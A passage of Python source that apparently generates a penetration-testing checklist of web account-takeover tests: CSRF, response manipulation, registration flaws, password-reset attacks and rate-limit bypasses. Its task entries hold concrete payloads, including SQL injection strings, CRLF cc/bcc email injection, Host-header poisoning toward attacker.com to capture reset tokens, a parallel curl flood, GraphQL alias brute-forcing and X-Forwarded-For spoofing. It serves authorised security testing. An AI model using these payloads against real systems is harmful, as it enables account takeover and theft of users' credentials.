                            'Burp: Remove CSRF token from request',
                            'Create auto-submit form to change victim credentials'
                        ],
                        'success_indicators': [
                            'Password/email change has no CSRF protection',
                            'CSRF token not validated',
                            'SameSite=None allows CSRF',
                            'Successful credential modification'
                        ],
                        'failure_indicators': [
                            'Strong CSRF tokens',
                            'SameSite=Strict cookies',
                            'Token validation enforced',
                            'Referer checking'
                        ],
                        'next_steps': [
                            'If vulnerable, create CSRF exploit',
                            'Host malicious page',
                            'Trick victim to visit',
                            'Complete account takeover'
                        ],
                        'notes': 'CSRF on password/email change = instant ATO. Test change password, change email, add auth method endpoints.'
                    }
                },
                {
                    'id': f'ato-response-manipulation-{port}',
                    'name': 'Response Manipulation ATO',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if authentication can be bypassed by manipulating server response',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Login with invalid credentials',
                            'Burp: Intercept response, change status to 200 OK',
                            'Burp: Change {"success":false} to {"success":true}',
                            'Burp: Change "error" to "success" in response',
                            'Manual: Test if client-side checks are bypassed',
                            'Check if session created despite auth failure'
                        ],
                        'success_indicators': [
                            'Modified response grants access',
                            'Client-side validation only',
                            'Session created regardless of auth result',
                            'Boolean flip bypasses check'
                        ],
                        'failure_indicators': [
                            'Server-side validation enforced',
                            'Session not created on failure',
                            'Response modification has no effect'
                        ],
                        'next_steps': [
                            'If bypass works, document response modification',
                            'Test on multiple endpoints',
                            'Check for privilege escalation',
                            'Verify full access granted'
                        ],
                        'notes': 'Weak client-side validation. Try changing false→true, 401→200, error→success. Burp Proxy intercept response.'
                    }
                },
                {
                    'id': f'ato-session-token-{port}',
                    'name': 'Old Session Token Reuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if old session tokens remain valid after logout/login',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Login, save session cookie',
                            'Manual: Logout from account',
                            'Manual: Attempt to use old session cookie',
                            'Manual: Test after password change',
                            'Manual: Test after new login',
                            'Check session invalidation on logout'
                        ],
                        'success_indicators': [
                            'Old cookies work after logout',
                            'Session persists after password change',
                            'Multiple valid sessions simultaneously',
                            'No proper session invalidation'
                        ],
                        'failure_indicators': [
                            'Logout invalidates session',
                            'Password change kills old sessions',
                            'One session per user enforced'
                        ],
                        'next_steps': [
                            'If tokens reusable, test XSS for token theft',
                            'Check token lifetime',
                            'Test session fixation',
                            'Document session management flaws'
                        ],
                        'notes': 'Sessions should be invalidated on logout/password change. Old token reuse indicates weak session management.'
                    }
                }
            ]
        }

    def _create_registration_vuln_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create registration vulnerability testing tasks"""
        return {
            'id': f'registration-vulns-{port}',
            'name': 'Registration Vulnerabilities',
            'type': 'parent',
            'children': [
                {
                    'id': f'reg-duplicate-account-{port}',
                    'name': 'Duplicate Registration Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for duplicate account registration bypasses',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: Register with victim@gmail.com (uppercase V)',
                            'Manual: Register with victim+1@gmail.com',
                            'Manual: Register with vic.tim@gmail.com (add dot)',
                            'Manual: Register with victim@gmail.com%00',
                            'Manual: Register with victim@gmail.com (trailing space)',
                            'Manual: Try victim@gmail.com@attacker.com',
                            'Manual: Try victim@attacker.com@gmail.com'
                        ],
                        'success_indicators': [
                            'Account created with variant email',
                            'Email verification bypassed',
                            'Access to victim account features',
                            'System normalizes to existing account'
                        ],
                        'failure_indicators': [
                            'Email already registered error',
                            'Strong email validation',
                            'Normalization before check',
                            'Separate accounts created'
                        ],
                        'next_steps': [
                            'If bypass works, test account privileges',
                            'Attempt to trigger password reset',
                            'Check for data access',
                            'Document successful variant'
                        ],
                        'notes': 'Gmail ignores dots and +suffix. victim@gmail.com = vic.tim@gmail.com = victim+1@gmail.com. Test case variations, special chars!'
                    }
                },
                {
                    'id': f'reg-username-enumeration-{port}',
                    'name': 'Registration Username Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if registration reveals existing usernames/emails',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Try to register as admin@company.com',
                            'Manual: Compare response for existing vs new email',
                            'Manual: Note timing differences',
                            'Manual: Check for "Email already registered" message',
                            'Burp Intruder: Test common usernames',
                            'Document exact error messages'
                        ],
                        'success_indicators': [
                            'Different message for existing accounts',
                            'Timing difference reveals existence',
                            'Can enumerate all registered users',
                            'Error: "User already exists"'
                        ],
                        'failure_indicators': [
                            'Same response regardless',
                            'Generic error messages',
                            'No information disclosure'
                        ],
                        'next_steps': [
                            'If enumerable, build user list',
                            'Use for password attacks',
                            'Test discovered emails for password reset',
                            'Combine with other attacks'
                        ],
                        'notes': 'Registration should not reveal if email/username exists. Different errors = username enumeration = brute force target list!'
                    }
                },
                {
                    'id': f'reg-password-policy-{port}',
                    'name': 'Password Policy Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for weak password requirements allowing brute force',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Try to register with password: 123',
                            'Manual: Try password: password',
                            'Manual: Test minimum length: 1234',
                            'Manual: Check for complexity requirements',
                            'Manual: Test if common passwords blocked',
                            'Document weakest accepted password'
                        ],
                        'success_indicators': [
                            'Weak passwords accepted (123, password)',
                            'Short minimum length (<8 chars)',
                            'No complexity requirements',
                            'Common passwords allowed'
                        ],
                        'failure_indicators': [
                            'Strong password policy enforced',
                            'Minimum 12+ characters',
                            'Complexity requirements',
                            'Common password blocking'
                        ],
                        'next_steps': [
                            'If weak policy, create brute force wordlist',
                            'Test short password dictionary',
                            'Document exact requirements',
                            'Combine with username enumeration'
                        ],
                        'notes': 'Weak password policy enables brute force. If "123456" works, attack feasible. Document min length, required chars for report.'
                    }
                },
                {
                    'id': f'reg-sql-injection-{port}',
                    'name': 'Registration SQL Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test registration form for SQL injection vulnerabilities',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: Register with username: admin\'--',
                            'Manual: Email: test@test.com\' or 1=1--',
                            'Manual: Password: \' UNION SELECT NULL--',
                            'sqlmap --forms --data="username=test&email=test@test.com&password=pass"',
                            'Burp: Test each parameter with SQLi payloads',
                            'Check for error messages revealing DB info'
                        ],
                        'success_indicators': [
                            'SQL error messages in response',
                            'Account created as existing user (admin)',
                            'Database information disclosure',
                            'Boolean-based blind SQLi detected'
                        ],
                        'failure_indicators': [
                            'Input sanitization blocks payloads',
                            'Prepared statements used',
                            'No SQL errors',
                            'WAF blocking attempts'
                        ],
                        'next_steps': [
                            'If vulnerable, attempt INSERT injection',
                            'Try to escalate to admin privileges',
                            'Extract database contents',
                            'Test for account takeover via injection'
                        ],
                        'notes': 'INSERT statement SQLi can create admin accounts! Test username=admin\'-- to inject into existing account.'
                    }
                },
                {
                    'id': f'reg-rate-limiting-{port}',
                    'name': 'Registration Rate Limit Test',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for account creation rate limiting and DoS potential',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'alternatives': [
                            'Manual: Create 10+ accounts rapidly',
                            'Burp Intruder: Automated registration attempts',
                            'Python script: Mass account creation',
                            'Test if disposable emails blocked',
                            'Check for IP-based rate limiting',
                            'Test email verification requirements'
                        ],
                        'success_indicators': [
                            'Unlimited account creation',
                            'No rate limiting',
                            'Disposable emails accepted',
                            'No email verification'
                        ],
                        'failure_indicators': [
                            'Rate limiting enforced',
                            'IP-based restrictions',
                            'Email verification required',
                            'Disposable email blocking'
                        ],
                        'next_steps': [
                            'If no limits, document DoS potential',
                            'Test resource consumption',
                            'Check for account cleanup',
                            'Note for low-severity report'
                        ],
                        'notes': 'Not direct ATO but indicates weak controls. Mass registration can cause DoS. Low priority for OSCP but document finding.'
                    }
                },
                {
                    'id': f'reg-oauth-takeover-{port}',
                    'name': 'OAuth Registration Takeover',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for account takeover via OAuth registration flow',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: Pre-register victim email without OAuth',
                            'Manual: Wait for victim to register via OAuth',
                            'Manual: Check if accounts merge',
                            'Manual: Test if attacker gains access',
                            'Manual: Try account linking vulnerabilities',
                            'Review OAuth implementation for flaws'
                        ],
                        'success_indicators': [
                            'Pre-registered account takes over OAuth',
                            'Attacker account merged with victim',
                            'No email verification on OAuth',
                            'Account linking allows takeover'
                        ],
                        'failure_indicators': [
                            'Separate accounts created',
                            'Email verification enforced',
                            'No account merging',
                            'Proper OAuth implementation'
                        ],
                        'next_steps': [
                            'If vulnerable, document exact flow',
                            'Test with multiple OAuth providers',
                            'Check for privilege escalation',
                            'Combine with other registration flaws'
                        ],
                        'notes': 'Pre-account takeover: Register victim@email.com manually, victim registers via OAuth → attacker account confirmed = ATO!'
                    }
                }
            ]
        }

    def _create_password_reset_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create password reset vulnerability tasks"""
        return {
            'id': f'password-reset-{port}',
            'name': 'Password Reset Attacks',
            'type': 'parent',
            'children': [
                {
                    'id': f'reset-token-leak-{port}',
                    'name': 'Password Reset Token Leakage',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for password reset token exposure via Referer or responses',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'alternatives': [
                            'Manual: Request password reset',
                            'Manual: Click reset link',
                            'Manual: Click third-party link (Facebook, etc)',
                            'Burp: Check Referer header for token',
                            'Manual: Check response body for token',
                            'Manual: Inspect cookies for reset token'
                        ],
                        'success_indicators': [
                            'Token leaked in Referer header',
                            'Token in response body',
                            'Token in JavaScript variables',
                            'Token in unprotected endpoint'
                        ],
                        'failure_indicators': [
                            'No token exposure',
                            'Token only via email',
                            'Proper token handling'
                        ],
                        'next_steps': [
                            'If leaked, capture victim token',
                            'Use token to reset victim password',
                            'Complete account takeover',
                            'Document leak vector'
                        ],
                        'notes': 'Check Referer header when clicking external links! Token may leak to third-party. Also check API responses for exposed tokens.'
                    }
                },
                {
                    'id': f'reset-host-poisoning-{port}',
                    'name': 'Password Reset Host Header Poisoning',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for host header injection to redirect reset links',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Burp: Intercept password reset request',
                            'Burp: Change Host: attacker.com',
                            'Burp: Add X-Forwarded-Host: attacker.com',
                            'Burp: Change Host, Referer, Origin to attacker.com',
                            'Manual: Check if email contains attacker.com link',
                            'Setup listener on attacker.com for token capture'
                        ],
                        'success_indicators': [
                            'Reset email contains attacker.com URL',
                            'Token sent to attacker-controlled host',
                            'Host header reflected in email',
                            'Victim clicks malicious link'
                        ],
                        'failure_indicators': [
                            'Host header ignored',
                            'Whitelist validation',
                            'Absolute URLs used',
                            'Proper host validation'
                        ],
                        'next_steps': [
                            'If vulnerable, setup token capture server',
                            'Trigger reset for victim',
                            'Capture token when victim clicks',
                            'Reset victim password'
                        ],
                        'notes': 'Host header poisoning allows token theft! Attacker triggers reset, victim gets link to attacker.com/reset?token=VICTIM_TOKEN'
                    }
                },
                {
                    'id': f'reset-email-parameter-{port}',
                    'name': 'Password Reset Email Parameter Pollution',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for email parameter pollution to intercept reset tokens',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: email=victim@mail.com&email=attacker@mail.com',
                            'Manual: {"email":["victim@mail.com","attacker@mail.com"]}',
                            'Manual: email=victim@mail.com%0A%0Dcc:attacker@mail.com',
                            'Manual: email=victim@mail.com%0A%0Dbcc:attacker@mail.com',
                            'Manual: email=victim@mail.com,attacker@mail.com',
                            'Manual: email=victim@mail.com|attacker@mail.com'
                        ],
                        'success_indicators': [
                            'Reset token sent to both emails',
                            'CC/BCC injection successful',
                            'Array parameter accepted',
                            'Attacker receives token'
                        ],
                        'failure_indicators': [
                            'Only first email used',
                            'Array rejected',
                            'Email injection blocked',
                            'Single recipient enforced'
                        ],
                        'next_steps': [
                            'If successful, use token to reset victim password',
                            'Test on multiple endpoints',
                            'Document exact payload',
                            'Complete account takeover'
                        ],
                        'notes': 'Parameter pollution: send multiple email params. JSON array, CC/BCC injection, comma/pipe separator. Attacker gets copy of token!'
                    }
                },
                {
                    'id': f'reset-idor-{port}',
                    'name': 'Password Reset IDOR',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for IDOR in password reset API allowing victim password change',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: Login to attacker account',
                            'Manual: Go to change password feature',
                            'Burp: Intercept password change request',
                            'Burp: Change email=attacker@test.com to email=victim@test.com',
                            'Burp: Change userID=123 to userID=456',
                            'Manual: Test if victim password changed'
                        ],
                        'success_indicators': [
                            'Victim password changed via IDOR',
                            'No authorization check',
                            'User parameter controlled by attacker',
                            'Successful ATO'
                        ],
                        'failure_indicators': [
                            'Authorization enforced',
                            'Session validation blocks IDOR',
                            'Current password required',
                            'Proper access control'
                        ],
                        'next_steps': [
                            'If vulnerable, change victim password',
                            'Login to victim account',
                            'Document IDOR parameter',
                            'Test on other endpoints'
                        ],
                        'notes': 'IDOR on password change API critical! POST /api/changepass with {"email":"victim@test.com","password":"newpass"} may work!'
                    }
                },
                {
                    'id': f'reset-weak-token-{port}',
                    'name': 'Weak Password Reset Token Analysis',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze password reset tokens for predictability and reuse',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Request 5+ reset tokens',
                            'Manual: Analyze token patterns',
                            'Manual: Check for timestamp encoding',
                            'Manual: Test MD5(email), MD5(username)',
                            'Manual: Check for sequential tokens',
                            'Manual: Test token reuse',
                            'Manual: Test token expiration'
                        ],
                        'success_indicators': [
                            'Tokens are predictable',
                            'MD5 hash of user data',
                            'Sequential/timestamp-based',
                            'No expiration enforced',
                            'Tokens can be reused'
                        ],
                        'failure_indicators': [
                            'Cryptographically random tokens',
                            'One-time use enforced',
                            'Short expiration time',
                            'No pattern detected'
                        ],
                        'next_steps': [
                            'If predictable, craft victim token',
                            'Test brute force of token space',
                            'Check for token reuse across users',
                            'Document generation algorithm'
                        ],
                        'notes': 'Weak tokens: MD5(email), timestamp, sequential numbers. Strong: cryptographically random, 32+ chars, single-use, expire <1 hour.'
                    }
                },
                {
                    'id': f'reset-username-collision-{port}',
                    'name': 'Password Reset Username Collision',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for account takeover via username collision with whitespace',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Register username "admin " (with trailing space)',
                            'Manual: Register username " admin" (with leading space)',
                            'Manual: Request password reset for "admin "',
                            'Manual: Use token to reset real admin account',
                            'Manual: Test if whitespace stripped on lookup'
                        ],
                        'success_indicators': [
                            'Username with spaces accepted',
                            'Reset token works for real account',
                            'Whitespace normalization flaw',
                            'Successful admin takeover'
                        ],
                        'failure_indicators': [
                            'Whitespace stripped on registration',
                            'Separate accounts created',
                            'Token tied to correct account',
                            'Proper username validation'
                        ],
                        'next_steps': [
                            'If vulnerable, reset admin password',
                            'Login to admin account',
                            'Document collision technique',
                            'Test with other special characters'
                        ],
                        'notes': 'CVE-2020-7245 (CTFd). Register "admin " with space, request reset, token resets real "admin" account. Rare but high impact!'
                    }
                },
                {
                    'id': f'reset-race-condition-{port}',
                    'name': 'Password Reset Race Condition',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for race conditions in password reset allowing multiple valid tokens',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'alternatives': [
                            'Manual: Request 2 resets simultaneously',
                            'Burp Repeater: Send 10 reset requests in parallel',
                            'Manual: Check if all tokens valid',
                            'Manual: Test if rate limit bypassed',
                            'Manual: Use oldest token for reset'
                        ],
                        'success_indicators': [
                            'Multiple valid tokens generated',
                            'Old tokens not invalidated',
                            'Race condition exploitable',
                            'Rate limit bypassed'
                        ],
                        'failure_indicators': [
                            'Only latest token valid',
                            'Old tokens invalidated',
                            'Rate limiting prevents race',
                            'Proper token management'
                        ],
                        'next_steps': [
                            'If exploitable, use to bypass rate limits',
                            'Generate multiple tokens for brute force',
                            'Document race window',
                            'Test on other endpoints'
                        ],
                        'notes': 'Race condition may generate multiple valid tokens or bypass rate limits. Use Burp Turbo Intruder for precise timing.'
                    }
                },
                {
                    'id': f'reset-skipoldpwd-{port}',
                    'name': 'Pre-Auth Password Reset via skipOldPwdCheck',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for password change endpoints that bypass old password verification',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: Find password change endpoint',
                            'Manual: POST with action=change_password&user_name=admin&confirm_new_password=NewPass',
                            'Burp: Remove old_password parameter',
                            'Burp: Add skipOldPwdCheck=true parameter',
                            'Manual: Test /api/changepass, /rpwd.php, /password/reset endpoints',
                            'Check if authentication required'
                        ],
                        'success_indicators': [
                            'Password changed without old password',
                            'No authentication required',
                            'skipOldPwdCheck parameter accepted',
                            'Arbitrary account takeover successful'
                        ],
                        'failure_indicators': [
                            'Old password required',
                            'Authentication enforced',
                            'Parameter validation blocks bypass',
                            'Token verification required'
                        ],
                        'next_steps': [
                            'If vulnerable, change admin password',
                            'Document exact endpoint and parameters',
                            'Test on other accounts',
                            'Verify sessions invalidated after change'
                        ],
                        'notes': 'CVE-style vulnerability. Look for change_password actions in password reset flows. Check if skipOldPwdCheck param exists in backend code.'
                    }
                },
                {
                    'id': f'reset-registration-upsert-{port}',
                    'name': 'Registration-as-Password-Reset (Upsert ATO)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if registration endpoint updates existing accounts instead of rejecting',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'alternatives': [
                            'Manual: Register with existing email: victim@test.com',
                            'Manual: POST {"email":"victim@test.com","password":"NewPass123"}',
                            'Manual: Check if registration succeeds',
                            'Manual: Try to login with new password',
                            'Test /signup, /register, /api/register endpoints',
                            'Try both JSON and form-urlencoded data'
                        ],
                        'success_indicators': [
                            'Registration succeeds with existing email',
                            'Login works with new password',
                            'No error about email already registered',
                            'Account takeover successful'
                        ],
                        'failure_indicators': [
                            'Error: Email already registered',
                            'Registration rejected',
                            'Separate account created',
                            'Email verification required'
                        ],
                        'next_steps': [
                            'If vulnerable, take over high-value accounts',
                            'Document registration endpoint',
                            'Test with admin accounts',
                            'Check if email verification bypassed'
                        ],
                        'notes': 'Critical pre-auth ATO! Backend upserts instead of checking uniqueness. Try /parents/application/v4/admin/doRegistrationEntries pattern.'
                    }
                },
                {
                    'id': f'reset-otp-session-rotation-{port}',
                    'name': 'OTP Rate Limit Bypass via Session Rotation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass OTP rate limiting by rotating session tokens',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Request password reset',
                            'Manual: Try 8-10 wrong OTP codes',
                            'Manual: Logout and login to get new session',
                            'Manual: Continue OTP brute-force with new session',
                            'Python: Automate session rotation every N attempts',
                            'Check if rate limit is session-based vs IP-based'
                        ],
                        'success_indicators': [
                            'Rate limit resets after logout/login',
                            'New session allows more OTP attempts',
                            'Successful OTP brute-force',
                            'No IP-based rate limiting'
                        ],
                        'failure_indicators': [
                            'Rate limit persists across sessions',
                            'IP-based rate limiting enforced',
                            'Account locked after N attempts',
                            'OTP invalidated on session change'
                        ],
                        'next_steps': [
                            'If viable, automate session rotation',
                            'Calculate time: 10k OTP / 8 per session = 1250 sessions',
                            'Combine with proxy rotation for speed',
                            'Document exact rate limit threshold'
                        ],
                        'notes': 'Weak rate limiting. If 4-digit OTP + session rotation = ~2-3 hours to brute-force. Test if OTP changes on session rotation!'
                    }
                },
                {
                    'id': f'reset-expired-token-{port}',
                    'name': 'Expired Token Reuse Test',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if expired password reset tokens can still be used',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Request password reset',
                            'Manual: Wait for token expiration (check email for time limit)',
                            'Manual: Try using expired token',
                            'Manual: Check if token still valid after 1 hour, 24 hours',
                            'Test if sessions expire but tokens dont',
                            'Try tokens from days/weeks ago'
                        ],
                        'success_indicators': [
                            'Expired token still works',
                            'No expiration enforced',
                            'Password reset successful with old token',
                            'Token valid indefinitely'
                        ],
                        'failure_indicators': [
                            'Token expired error',
                            'Time-based validation enforced',
                            'Token invalidated after use',
                            'Proper expiration (< 1 hour)'
                        ],
                        'next_steps': [
                            'If no expiration, document token lifetime',
                            'Test if tokens survive password changes',
                            'Check for token reuse after successful reset',
                            'Combine with token theft vectors'
                        ],
                        'notes': 'Tokens should expire in 15-60 minutes. Indefinite validity = high severity finding. Test with old emails from days ago!'
                    }
                },
                {
                    'id': f'reset-response-manipulation-{port}',
                    'name': 'Password Reset Response Manipulation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if modifying error responses bypasses password reset restrictions',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Request password reset with invalid token',
                            'Burp: Intercept error response',
                            'Burp: Change {"success":false} to {"success":true}',
                            'Burp: Change 400/401 status to 200 OK',
                            'Burp: Remove error message field',
                            'Test if client-side validation only'
                        ],
                        'success_indicators': [
                            'Modified response bypasses check',
                            'Client-side validation only',
                            'Session created despite error',
                            'Password reset succeeds with manipulation'
                        ],
                        'failure_indicators': [
                            'Server-side validation enforced',
                            'Response manipulation has no effect',
                            'Session not created on error',
                            'Proper backend validation'
                        ],
                        'next_steps': [
                            'If vulnerable, document exact response modification',
                            'Test on other endpoints',
                            'Check for XSS in error messages',
                            'Attempt to bypass other restrictions'
                        ],
                        'notes': 'Client-side validation flaw. Try changing response status codes, JSON booleans, error strings. Use Burp Proxy match/replace rules.'
                    }
                },
                {
                    'id': f'reset-token-brute-force-{port}',
                    'name': 'Password Reset Token Brute-Force',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Attempt to brute-force password reset tokens (4-6 digit numeric)',
                        'tags': ['OSCP:MEDIUM', 'NOISY', 'MANUAL'],
                        'alternatives': [
                            'Manual: Analyze token format (numeric, alphanumeric, length)',
                            'Burp Intruder: Numeric payload 000000-999999',
                            'Manual: Test rate limiting threshold',
                            'Combine with IP rotation (fireprox, Burp IPRotate)',
                            'Python script with random OTP generation',
                            'Check for silent rate limiting (no error but blocks)'
                        ],
                        'success_indicators': [
                            'No rate limiting detected',
                            'Token space small enough (<10k combinations)',
                            'Successful brute-force',
                            'Different response on correct token'
                        ],
                        'failure_indicators': [
                            'Strong rate limiting',
                            'Account lockout after N attempts',
                            'Large token space (6+ alphanumeric)',
                            'IP blocking enforced'
                        ],
                        'next_steps': [
                            'Calculate attack time: tokens / rate = hours',
                            'If 4-digit numeric: 10k attempts * 1sec = 2.7 hours',
                            'Use Turbo Intruder for speed',
                            'Document rate limit bypass techniques'
                        ],
                        'notes': 'Only viable with weak tokens (4-6 digit numeric) + no rate limit. 6-char alphanumeric = 2 billion combinations = impractical!'
                    }
                },
                {
                    'id': f'reset-guessable-uuid-{port}',
                    'name': 'Guessable UUID Token Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if UUID v1 tokens are predictable and exploitable',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'alternatives': [
                            'Manual: Collect 5+ reset tokens',
                            'Manual: Analyze UUID structure (check version bits)',
                            'Tool: guidtool (github.com/intruder-io/guidtool)',
                            'Manual: UUIDv1 = timestamp + MAC address',
                            'Manual: Calculate time difference between tokens',
                            'Manual: Predict next token based on pattern'
                        ],
                        'success_indicators': [
                            'UUID version 1 detected (timestamp-based)',
                            'Predictable token generation',
                            'MAC address exposed',
                            'Successful token prediction'
                        ],
                        'failure_indicators': [
                            'UUID version 4 (random)',
                            'No pattern detected',
                            'Sufficient randomness',
                            'Cannot predict tokens'
                        ],
                        'next_steps': [
                            'If UUIDv1, extract timestamp and MAC',
                            'Generate candidate tokens for time window',
                            'Brute-force small time range',
                            'Document UUID generation weakness'
                        ],
                        'notes': 'UUIDv1 weakness! Contains timestamp (60-bit) + MAC (48-bit). Reduces search space from 128-bit random. Use guidtool for analysis.'
                    }
                }
            ]
        }

    def _create_rate_limit_bypass_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create rate limit bypass testing tasks"""
        return {
            'id': f'rate-limit-bypass-{port}',
            'name': 'Rate Limit Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'rate-header-manipulation-{port}',
                    'name': 'Rate Limit Bypass via Header Manipulation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass IP-based rate limiting by spoofing origin headers',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'alternatives': [
                            'Burp: Add X-Forwarded-For: 1.2.3.4 header',
                            'Burp: Add X-Originating-IP: 127.0.0.1',
                            'Burp: Add X-Remote-IP, X-Remote-Addr, X-Client-IP headers',
                            'Burp: Duplicate X-Forwarded-For header (send two)',
                            'Manual: Rotate IP addresses in header (1.1.1.1, 2.2.2.2, etc)',
                            'Test: Add X-Host, X-Forwarded-Host headers',
                            'Burp Intruder: Payload type = numbers 1-255 in IP header'
                        ],
                        'success_indicators': [
                            'Rate limit bypassed with spoofed headers',
                            'Different IP treated as new client',
                            'Unlimited requests possible',
                            'Backend trusts X-Forwarded-For blindly'
                        ],
                        'failure_indicators': [
                            'Header manipulation has no effect',
                            'Real IP used for rate limiting',
                            'Header validation enforced',
                            'WAF strips custom headers'
                        ],
                        'next_steps': [
                            'If bypass works, automate header rotation',
                            'Test which headers are trusted',
                            'Combine with other bypass techniques',
                            'Document exact headers that work'
                        ],
                        'notes': 'Most common bypass! Backend may trust X-Forwarded-For without validation. Try double X-Forwarded-For trick. Time: 2-3 minutes.'
                    }
                },
                {
                    'id': f'rate-http2-multiplexing-{port}',
                    'name': 'HTTP/2 Multiplexing Rate Limit Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass rate limits using HTTP/2 stream multiplexing on single connection',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'NOISY'],
                        'alternatives': [
                            f'curl: seq 1 100 | xargs -I@ -P0 curl --http2-prior-knowledge -X POST {base_url}/api/verify',
                            'Burp Turbo Intruder: Enable HTTP/2, set requestsPerConnection=100',
                            'Manual: Test if rate limit counts TCP connections vs HTTP/2 streams',
                            'Manual: Send 100 parallel streams in single TLS connection',
                            'Check if /api/v2/verify unprotected while /verify is protected'
                        ],
                        'success_indicators': [
                            'Single connection allows multiple streams',
                            'Rate limit counts connections not streams',
                            '100+ requests in <1 second',
                            'No rate limit errors'
                        ],
                        'failure_indicators': [
                            'Rate limit per stream enforced',
                            'HTTP/2 disabled',
                            'Connection throttling',
                            'Stream limit enforced'
                        ],
                        'next_steps': [
                            'If successful, tune maxConcurrentConnections',
                            'Test path confusion (/verify vs /api/v2/verify)',
                            'Combine with credential brute-force',
                            'Document exact HTTP/2 behavior'
                        ],
                        'notes': 'Modern bypass (2023+)! Rate limiters count TCP connections, not HTTP/2 streams. Use Turbo Intruder with HTTP/2 support for automation.'
                    }
                },
                {
                    'id': f'rate-graphql-batching-{port}',
                    'name': 'GraphQL Batching & Aliases Rate Limit Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass rate limits using GraphQL query batching and aliases',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: Send single GraphQL query with multiple aliases',
                            'Manual: mutation { a:login(user:"admin",pass:"1") b:login(user:"admin",pass:"2") ... }',
                            'Manual: Add 20-50 aliases in one request',
                            'Manual: mutation bruteForce { a:verify(code:"0000") b:verify(code:"0001") ... }',
                            'Check if rate limiter counts request vs mutation executions',
                            'Test array batching: [{"query":"..."},{"query":"..."}]'
                        ],
                        'success_indicators': [
                            'Single request executes multiple operations',
                            'Rate limit bypassed with aliases',
                            'One alias succeeds with correct credential',
                            'Backend executes all aliases despite rate limit'
                        ],
                        'failure_indicators': [
                            'Query complexity limits enforced',
                            'Alias count restricted',
                            'Per-operation rate limiting',
                            'GraphQL not available'
                        ],
                        'next_steps': [
                            'If bypass works, craft large alias batches',
                            'Test maximum aliases per request',
                            'Combine with OTP/password brute-force',
                            'Document GraphQL endpoint behavior'
                        ],
                        'notes': 'PortSwigger 2023 research! GraphQL aliases allow 100+ login attempts in single request. Rate limiter counts request, not operations!'
                    }
                },
                {
                    'id': f'rate-batch-endpoint-{port}',
                    'name': 'Bulk/Batch Endpoint Rate Limit Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass rate limits using bulk/batch API endpoints',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Look for /api/batch, /api/v2/batch endpoints',
                            'Manual: POST [{"path":"/login","method":"POST","body":{...}},{"path":"/login",...}]',
                            'Manual: Wrap multiple operations in single bulk request',
                            'Manual: Test if legacy endpoints protected but bulk endpoint not',
                            'Check API documentation for batch capabilities',
                            'Try _bulk, /batch, /multi endpoints'
                        ],
                        'success_indicators': [
                            'Batch endpoint accepts array of operations',
                            'Rate limit on individual endpoints bypassed',
                            'Multiple operations executed in single request',
                            'No rate limit on batch endpoint'
                        ],
                        'failure_indicators': [
                            'Batch endpoint not found',
